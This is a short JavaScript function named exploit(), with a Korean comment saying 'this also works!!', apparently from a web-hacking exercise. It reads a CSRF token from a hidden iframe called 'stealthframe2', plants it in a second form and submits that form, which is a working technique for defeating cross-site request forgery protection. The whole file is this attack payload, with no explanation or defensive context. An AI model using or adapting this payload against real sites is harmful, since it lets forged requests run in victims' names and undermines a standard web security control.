function exploit() {
    let csrfToken = document.getElementById('stealthframe2').contentDocument.getElementsByName('csrf_token')[0].value   // 이것도 가능!!

    document.getElementsByName('csrf_token')[1].value = csrfToken;
    document.getElementById('csrfForm').submit();
}
